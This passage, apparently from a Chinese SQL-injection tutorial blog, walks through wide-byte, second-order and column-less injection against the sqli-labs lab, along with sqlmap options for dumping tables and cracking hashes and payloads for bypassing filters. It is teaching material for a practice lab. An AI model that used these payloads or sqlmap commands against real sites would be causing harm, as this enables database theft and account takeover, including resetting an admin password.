title="十一、宽字节注入"></a>十一、宽字节注入</h2><p>宽字节是相对于ascII这样单字节而言的，像GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节</p><p>GBK是一种多字符的编码，通常来说，一个gbk编码汉字，占用2个字节。一个utf-8编码的汉字，占用3个字节</p><p>转义函数：为了过滤用户输入的一些数据，对特殊的字符加上反斜杠“\”进行转义；Mysql中转义的函数addslashes，mysql_real_escape_string，mysql_escape_string等，还有一种是配置magic_quote_gpc，不过PHP高版本已经移除此功能</p><p>宽字节注入指的是mysql数据库在使用宽字节（GBK）编码时，会认为两个字符是一个汉字（前一个ascii码要大于128（比如<code>%df</code>），才到汉字的范围），而且当我们输入单引号时，mysql会调用转义函数，将单引号变为<code>\&#39;</code>，其中<code>\</code>的十六进制是<code>%5c</code>,mysql的GBK编码，会认为<code>%df%5c</code>是一个宽字节，也就是<code>&#39;運&#39;</code>，从而使单引号闭合（逃逸），进行注入攻击</p><p><a href="http://10.211.55.6/sqli-labs/Less-32/">http://10.211.55.6/sqli-labs/Less-32/</a></p><h3 id="1、注入尝试"><a href="#1、注入尝试" class="headerlink" title="1、注入尝试"></a>1、注入尝试</h3><p>输入单引号</p><blockquote><p>?id&#x3D;1%df’</p></blockquote><blockquote></blockquote><p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/17b06b01-922a-4df3-85d5-d43c7f966f46/Untitled.png" alt="Untitled"></p><p>页面无报错</p><blockquote><p>?id&#x3D;1%df’</p></blockquote><blockquote></blockquote><p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/07816e7c-3098-4d2a-adac-aa5eb4ff1d15/Untitled.png" alt="Untitled"></p><p>此时单引号已经逃逸出来，后续步骤和之前相同</p><p>若遇到<code>table_name=&#39;users&#39;</code> 可以使用十六进制进行代替</p><h2 id="十二、二次注入"><a href="#十二、二次注入" class="headerlink" title="十二、二次注入"></a>十二、二次注入</h2><p>二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入</p><p><a href="http://10.211.55.6/sqli-labs/Less-24/">http://10.211.55.6/sqli-labs/Less-24/</a></p><p>file:&#x2F;&#x2F;Less-24&#x2F;login.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqllogin</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="variable">$username</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&quot;login_user&quot;</span>]);</span><br><span class="line">   <span class="variable">$password</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&quot;login_password&quot;</span>]);</span><br><span class="line">   <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="comment">//$sql = &quot;SELECT COUNT(*) FROM users WHERE username=&#x27;$username&#x27; and password=&#x27;$password&#x27;&quot;;</span></span><br><span class="line">   <span class="variable">$res</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;You tried to be real smart, Try harder!!!! :( &#x27;</span>);</span><br><span class="line">   <span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_row</span>(<span class="variable">$res</span>);</span><br><span class="line">  <span class="comment">//print_r($row) ;</span></span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="number">1</span>]) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable">$row</span>[<span class="number">1</span>];</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用了<code>mysql_real_escape_string</code> 函数转义了传入字符串的特殊字符，导致无法进行注入</p><p>file:&#x2F;&#x2F;Less-24&#x2F;pass_change.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Validating the user input........</span></span><br><span class="line">  <span class="variable">$username</span>= <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line">  <span class="variable">$curr_pass</span>= <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;current_password&#x27;</span>]);</span><br><span class="line">  <span class="variable">$pass</span>= <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">  <span class="variable">$re_pass</span>= <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;re_password&#x27;</span>]);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$pass</span>==<span class="variable">$re_pass</span>)</span><br><span class="line">  &#123;  </span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="subst">$pass</span>&#x27; where username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$curr_pass</span>&#x27; &quot;</span>;</span><br><span class="line">    <span class="variable">$res</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;You tried to be smart, Try harder!!!! :( &#x27;</span>);</span><br><span class="line">    <span class="variable">$row</span> = <span class="title function_ invoke__">mysql_affected_rows</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$row</span>==<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Password successfully updated&quot;</span>;</span><br><span class="line">  </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: failed.php&#x27;</span>);</span><br><span class="line">      <span class="comment">//echo &#x27;You tried to be smart, Try harder!!!! :( &#x27;;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>同样使用了<code>mysql_real_escape_string</code> 函数转义</p><p>但username是直接从seesion中取出的，并未进行转义和过滤</p><p>这里可以通过控制username的名字来进行注入</p><p>首先注册admin’– - 账号，密码任意</p><p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/95924047-1697-4768-9596-29b36005e662/Untitled.png" alt="Untitled"></p><p>若此时再修改密码，后台语句则变为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="subst">$pass</span>&#x27; where username=&#x27;admin&#x27;-- &#x27; and password=&#x27;<span class="subst">$curr_pass</span>&#x27; &quot;</span>;</span><br></pre></td></tr></table></figure><p>此时admin的密码将会修改为指定的密码</p><p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/fa6d3999-5d4e-43bd-a184-2641f4d482ee/Untitled.png" alt="Untitled"></p><p>同样，可以利用这注入点进行盲注的判断</p><blockquote><p>admin’ and left(database(),8)&#x3D;’security’– -</p></blockquote><blockquote></blockquote><p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/9c253d4b-4ebc-4959-a7d9-804fb4b866d9/Untitled.png" alt="Untitled"></p><h2 id="十三、无列名注入"><a href="#十三、无列名注入" class="headerlink" title="十三、无列名注入"></a>十三、无列名注入</h2><p>当<code>information_schema</code>或<code>列名</code>被过滤时，将无法使用列来进行数据的查询，此时可使用无列名注入</p><p>二次注入是sql注入的一种，但是比普通sql注入利用更加困难，利用门槛更高。普通注入数据直接进入到 SQL 查询中，而二次注入则是输入数据经处理后存储，取出后，再次进入到 SQL 查询。</p><h3 id="1、基本原理"><a href="#1、基本原理" class="headerlink" title="1、基本原理"></a>1、基本原理</h3><p>观察如下语句的输出</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> security.users</span><br></pre></td></tr></table></figure><p>此时列名已经更改为<code>1,2,3</code></p><p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/c35fa418-6888-471f-8d73-cb270d4f29e7/Untitled.png" alt="Untitled"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> `<span class="number">2</span>` <span class="keyword">FROM</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> `security`.users)a</span><br></pre></td></tr></table></figure><p>前方列名要加上反引号&#96;&#96;&#96; 否则结果不能正常输出</p><p>后方要加上别名</p><p>若过滤了反引号，则可以使用别名代替</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> b,d <span class="keyword">FROM</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> <span class="keyword">as</span> b,<span class="number">3</span> <span class="keyword">as</span> d <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> `security`.users)a</span><br></pre></td></tr></table></figure><h3 id="2、获取数据库名"><a href="#2、获取数据库名" class="headerlink" title="2、获取数据库名"></a>2、获取数据库名</h3><p>sys视图</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> table_schema <span class="keyword">FROM</span> `sys`.`schema_auto_increment_columns`;</span><br><span class="line"><span class="keyword">SELECT</span> table_schema <span class="keyword">FROM</span> `sys`.`schema_index_statistics`;</span><br><span class="line"><span class="keyword">SELECT</span> table_schema <span class="keyword">FROM</span> `sys`.`schema_table_statistics`;</span><br><span class="line"><span class="keyword">SELECT</span> table_schema <span class="keyword">FROM</span> `sys`.`schema_table_statistics_with_buffer`;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3、获取表名"><a href="#3、获取表名" class="headerlink" title="3、获取表名"></a>3、获取表名</h3><p>在MySQL 5.7.9中sys中新增了一些视图，可以从中获取表名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>包含<span class="keyword">in</span></span><br><span class="line"><span class="keyword">SELECT</span> object_name <span class="keyword">FROM</span> `sys`.`x$innodb_buffer_stats_by_table` <span class="keyword">where</span> object_schema <span class="operator">=</span> database();</span><br><span class="line"><span class="keyword">SELECT</span> object_name <span class="keyword">FROM</span> `sys`.`innodb_buffer_stats_by_table` <span class="keyword">WHERE</span> object_schema <span class="operator">=</span> DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> TABLE_NAME <span class="keyword">FROM</span> `sys`.`x$schema_index_statistics` <span class="keyword">WHERE</span> TABLE_SCHEMA <span class="operator">=</span> DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> TABLE_NAME <span class="keyword">FROM</span> `sys`.`schema_index_statistics` <span class="keyword">WHERE</span> TABLE_SCHEMA <span class="operator">=</span> DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> TABLE_NAME <span class="keyword">FROM</span> `sys`.`schema_auto_increment_columns` <span class="keyword">WHERE</span> TABLE_SCHEMA <span class="operator">=</span> DATABASE();</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>不包含<span class="keyword">in</span></span><br><span class="line"><span class="keyword">SELECT</span> TABLE_NAME <span class="keyword">FROM</span> `sys`.`x$schema_flattened_keys` <span class="keyword">WHERE</span> TABLE_SCHEMA <span class="operator">=</span> DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> TABLE_NAME <span class="keyword">FROM</span> `sys`.`schema_table_statistics` <span class="keyword">WHERE</span> TABLE_SCHEMA <span class="operator">=</span> DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> TABLE_NAME <span class="keyword">FROM</span> `sys`.`x$ps_schema_table_statistics_io` <span class="keyword">WHERE</span> TABLE_SCHEMA <span class="operator">=</span> DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> TABLE_NAME <span class="keyword">FROM</span> `sys`.`x$schema_table_statistics_with_buffer` <span class="keyword">WHERE</span> TABLE_SCHEMA <span class="operator">=</span> DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> TABLE_NAME <span class="keyword">FROM</span> `sys`.`schema_table_statistics_with_buffer` <span class="keyword">WHERE</span> TABLE_SCHEMA <span class="operator">=</span> DATABASE();</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>通过表文件的存储路径获取表名</span><br><span class="line"><span class="keyword">SELECT</span> FILE <span class="keyword">FROM</span> `sys`.`io_global_by_file_by_bytes` <span class="keyword">WHERE</span> FILE REGEXP DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> FILE <span class="keyword">FROM</span> `sys`.`io_global_by_file_by_latency` <span class="keyword">WHERE</span> FILE REGEXP DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> FILE <span class="keyword">FROM</span> `sys`.`x$io_global_by_file_by_bytes` <span class="keyword">WHERE</span> FILE REGEXP DATABASE();</span><br></pre></td></tr></table></figure><p>performance_schema</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> object_name <span class="keyword">FROM</span> `performance_schema`.`objects_summary_global_by_type` <span class="keyword">WHERE</span> object_schema <span class="operator">=</span> DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> object_name <span class="keyword">FROM</span> `performance_schema`.`table_handles` <span class="keyword">WHERE</span> object_schema <span class="operator">=</span> DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> object_name <span class="keyword">FROM</span> `performance_schema`.`table_io_waits_summary_by_index_usage` <span class="keyword">WHERE</span> object_schema <span class="operator">=</span> DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> object_name <span class="keyword">FROM</span> `performance_schema`.`table_io_waits_summary_by_table` <span class="keyword">WHERE</span> object_schema <span class="operator">=</span> DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> object_name <span class="keyword">FROM</span> `performance_schema`.`table_lock_waits_summary_by_table` <span class="keyword">WHERE</span> object_schema <span class="operator">=</span> DATABASE();</span><br></pre></td></tr></table></figure><h3 id="4、查询数据"><a href="#4、查询数据" class="headerlink" title="4、查询数据"></a>4、查询数据</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> `<span class="number">2</span>` <span class="keyword">FROM</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> `security`.users)a</span><br><span class="line"><span class="keyword">select</span> b,d <span class="keyword">FROM</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> <span class="keyword">as</span> b,<span class="number">3</span> <span class="keyword">as</span> d <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> `security`.users)a</span><br></pre></td></tr></table></figure><h1 id="V、SQLMAP"><a href="#V、SQLMAP" class="headerlink" title="V、SQLMAP"></a>V、SQLMAP</h1><p>SQL注入自动化神器</p><p><a href="https://sqlmap.org/">sqlmap: automatic SQL injection and database takeover tool</a></p><h2 id="一、基本使用"><a href="#一、基本使用" class="headerlink" title="一、基本使用"></a>一、基本使用</h2><ul><li><p><strong>指定目标</strong></p><blockquote><p>参数： <code>-u [url]</code> 或 <code>--url  [url]</code></p></blockquote><p>  使用参数 -u 或 –url 指定一个 URL 作为目标，该参数后跟一个表示 URL 的字符串，还可以指定端口，如：</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u <span class="string">&quot;www.baidu.com/user.php?id=7&quot;</span></span><br><span class="line">sqlmap.py -url <span class="string">&quot;www.baidu.com:8080/user.php?id=7&quot;</span></span><br></pre></td></tr></table></figure><ul><li><p><strong>从文件读取目标</strong></p><blockquote><p>参数：<code>-m [filename]</code></p></blockquote><p>  文件中保存url格式如下，sqlmap会一个一个检测</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www.target1.com/vuln1.php?q=foobar</span><br><span class="line">www.target2.com/vuln2.asp?id=<span class="number">1</span></span><br><span class="line">www.target3.com/vuln3/id/<span class="number">1</span>*</span><br></pre></td></tr></table></figure><ul><li><p><strong>从文件载入 HTTP 请求测试</strong></p><blockquote><p>使用参数：<code>-r</code></p></blockquote><p>  可以可以理解抓个包下来，获取 HTTP 请求然后保存在文件里，然后让 SQLMap 自己去解析请求来进行注入测试。</p><p>  这样可以避免设置很多的参数，例如POST Cookie等</p><p>  可以从 burp suite 上抓包下来配合 SQLMap 进行联合使用。</p><p>  使用<code>*</code>标识注入点</p><p>  当请求是HTTPS的时候你需要配合这个–force-ssl参数来使用，或者你可以在Host头后面加上:443</p></li><li><p><strong>指定注入点：</strong>*</p><p>  SQLMap 可以区分一个 URL 里面的参数来进行注入点测试，但在遇到了一些做了伪静态的网页就无法自动识别了。</p><p>  <code>/admin/1/</code> 类似于这种，SQLMap 便无法进行注入测试，但它实际上可能是这样： <code>/admin.php?id=1</code></p><p>  它只是把参数隐藏在了 URL 中，对于这种网页，直接在参数后加上一个星号即可。</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u <span class="string">&quot;www.baidu.com/admin/1*&quot;</span></span><br></pre></td></tr></table></figure><ul><li><p><strong>POST 数据</strong></p><blockquote><p>使用参数：<code>-date</code></p></blockquote><p>  在 URL 后跟上你要提交的 POST 数据，SQLMap 也会去自动测试。</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u <span class="string">&quot;http://baidu.com/admin.php&quot;</span> --data=<span class="string">&quot;id=1&amp;name=admin&quot;</span></span><br></pre></td></tr></table></figure><ul><li><p><strong>cookie</strong></p><blockquote><p>使用参数：<code>-cookie</code></p></blockquote><p>  这种方式多半来进行 cookie 的注入检测，设置比较繁琐，也可以直接设置测试等级为 3，会自动测试是否存在 cookie 注入。</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u <span class="string">&quot;http://baidu.com/admin.php&quot;</span> --cookie <span class="string">&quot;customerId=591edabaab5b52292042df8a&quot;</span></span><br></pre></td></tr></table></figure><ul><li><p><strong>设定输出等级：</strong></p><blockquote><p>使用参数：<code>-v  [0-6]</code></p></blockquote><p>  V 这个命令，在 SQLMap 里可以理解成是一共输出的信息，他的测试等级是非常多的，一共分了七个等级出来，这七个等级在测试的时候会在界面里返回不同的内容。</p><p>  默认是 1，也可以在命令后指定 -v 3 就是等级 3 的输出。</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0：只显示 Python 的 tracebacks 信息、错误信息 [ERROR] 和关键信息 [CRITICAL]；</span><br><span class="line">1：同时显示普通信息 [INFO] 和警告信息 [WARNING]；</span><br><span class="line">2：同时显示调试信息 [DEBUG]；</span><br><span class="line">3：同时显示注入使用的攻击荷载；</span><br><span class="line">4：同时显示 HTTP 请求；</span><br><span class="line">5：同时显示 HTTP 响应头；</span><br><span class="line">6：同时显示 HTTP 响应体。</span><br></pre></td></tr></table></figure><pre><code>推荐使用 3 等级，这样会给出 payload</code></pre><ul><li><p><strong>设定扫描级别：</strong></p><blockquote><p>使用参数：<code>--level [0-6]</code></p></blockquote><p>  共有五个等级，默认为1，sqlmap使用的payload可以在xml&#x2F;payloads.xml中看到，你也可以根据相应的格式添加自己的payload。</p><p>  这个参数不仅影响使用哪些payload同时也会影响测试的注入点，GET和POST的数据都会测试，HTTP Cookie在level为2的时候就会测试，HTTP User-Agent&#x2F;Referer头在level为3的时候就会测试。</p><p>  总之在你不确定哪个payload或者参数为注入点的时候，为了保证全面性，建议使用高的level值。</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1：</span><br><span class="line">2：HTTP Cookie头注入；</span><br><span class="line">3：HTTP User-Agent/Referer头注入；</span><br><span class="line">4：</span><br><span class="line">5：增加测试到50个字段（默认10）；</span><br></pre></td></tr></table></figure><ul><li><p><strong>风险等级：</strong></p><blockquote><p>参数：<code>--risk</code></p></blockquote><p>  共有四个风险等级</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1：会测试大部分的测试语句（默认）</span><br><span class="line">2：会增加基于事件的测试语句</span><br><span class="line">3：会增加OR语句的SQL注入测试</span><br><span class="line">4：</span><br></pre></td></tr></table></figure><pre><code>在有些时候，例如在UPDATE的语句中，注入一个OR的测试语句，可能导致更新的整个表，可能造成很大的风险。测试的语句同样可以在xml/payloads.xml中找到，也可以自行添加payload。</code></pre><ul><li><p><strong>注入技术</strong></p><blockquote><p>参数：<code>--technique</code></p></blockquote><p>  这个参数可以指定sqlmap使用的探测技术，默认情况下会测试所有的方式。</p><p>  支持的探测方式如下：</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">B: Boolean-based blind SQL injection（布尔型注入）</span><br><span class="line">E: <span class="built_in">Error</span>-based SQL injection（报错型注入）</span><br><span class="line">U: UNION query SQL injection（可联合查询注入）</span><br><span class="line">S: Stacked queries SQL injection（可多语句查询注入)</span><br><span class="line">T: Time-based blind SQL injection（基于时间延迟注入）</span><br></pre></td></tr></table></figure><ul><li><p><strong>用户</strong></p><blockquote><p>参数：<code>--current-user</code></p></blockquote><p>  在大多数据库中可以获取到管理数据的用户。</p></li><li><p><strong>当前数据库</strong></p><blockquote><p>参数：<code>--current-db</code></p></blockquote><p>  返还当前连接的数据库。</p></li><li><p><strong>当前用户是否为管理员</strong></p><p>  参数：<code>--is-dba</code></p><p>  判断当前的用户是否为管理，是的话会返回True。</p></li><li><p><strong>列数据库管理用户</strong></p><blockquote><p>参数：<code>--users</code></p></blockquote><p>  当前用户有权限读取包含所有用户的表的权限时，就可以列出所有管理用户。</p></li><li><p><strong>列出并破解用户hash</strong></p><blockquote><p>参数：<code>--passwords</code></p></blockquote><p>  当前用户有权限读取包含用户密码表的权限时，sqlmap会列举出用户，然后列出hash，并尝试破解。</p></li><li><p>**列库 ****<code>dbs</code>**</p><blockquote><p>参数： <code>--dbs</code></p></blockquote><p>  列出当前数据库系统中的数据库</p></li><li><p>**列表 ****<code>tables</code>**</p><blockquote><p>命令是 <code>-D [数据库名] --tables</code></p></blockquote><p>  列出指定的数据库的表，若是不使用-D参数来指定一个数据库时，sqlmap会列出数据库所有库的所有表。</p></li><li><p>**列出表中字段 ****<code>columns</code>**</p><blockquote><p>参数： <code>-D [数据库名] -T [表名] --columns</code></p></blockquote><p>  当前用户有权限读取包含所有数据库表信息的表中的时候，即可列出指定数据库表中的字段，同时也会列出字段的数据类型。</p><p>  如果没有使用-D参数指定数据库时，默认会使用当前数据库。</p></li><li><p><strong>列举数据库系统的架构</strong></p><blockquote><p>参数：<code>--schema --exclude-sysdbs</code></p></blockquote><p>  用户可以用此参数获取数据库的架构，包含所有的数据库，表和字段，以及各自的类型。</p><p>  加上–exclude-sysdbs参数，将不会获取数据库自带的系统库内容。</p></li><li><p><strong>获取表中数据个数</strong></p><blockquote><p>参数：<code>--count</code></p></blockquote><p>  有时候用户只想获取表中的数据个数而不是具体的内容，那么就可以使用这个参数。</p></li><li><p><strong>获取整个表的数据</strong></p><blockquote><p>参数：<code>--dump -C [列名] -T [表名] -D [数据库名]</code></p></blockquote><p>  如果当前管理员有权限读取数据库其中的一个表的话，那么就能获取这个表的所有内容。</p><p>  使用-D,-T参数指定想要获取哪个库的哪个表，不适用-D参数时，默认使用当前库。</p></li></ul><h1 id="VI、注入绕过"><a href="#VI、注入绕过" class="headerlink" title="VI、注入绕过"></a>VI、注入绕过</h1><h3 id="1、绕过空格"><a href="#1、绕过空格" class="headerlink" title="1、绕过空格"></a>1、绕过空格</h3><p><strong>使用URL编码的特殊字符 ：</strong></p><p><code>%20</code> ：空格</p><p><code>%09</code> ：TAB(水平)</p><p><code>%0a</code> ：新建一行</p><p><code>%0b</code> ：TAB(垂直)</p><p><code>%0c</code> ：新的一页</p><p><code>%0d</code> ：return功能</p><p><code>%a0</code> ：空格</p><p><code>%00</code> ：空</p><p><a href="http://10.211.55.6/sqli-labs/Less-26/">http://10.211.55.6/sqli-labs/Less-26/</a></p><blockquote><p>?id&#x3D;<code>0&#39;%0bunion%0bselect%0b1,database(),&#39;3</code></p></blockquote><aside><p>💡 在 Windows 下会有无法用特殊字符代替空格的问题，这是 Apache 解析的问题，Linux 下无这个问题。</p></aside><p><strong>使用注释：</strong><code>/**/</code>  <code>/*!*/</code></p><p><strong>使用浮点数：</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">8E0</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">8.0</span><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br><span class="line"># 以上语句等价于</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">8</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure><h3 id="2、绕过引号"><a href="#2、绕过引号" class="headerlink" title="2、绕过引号"></a>2、绕过引号</h3><p>一般引号会出现在SQL语句的<code>where</code>子句中</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.COLUMNS <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> <span class="keyword">and</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>使用对应十六进制的字符串进行替换</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span 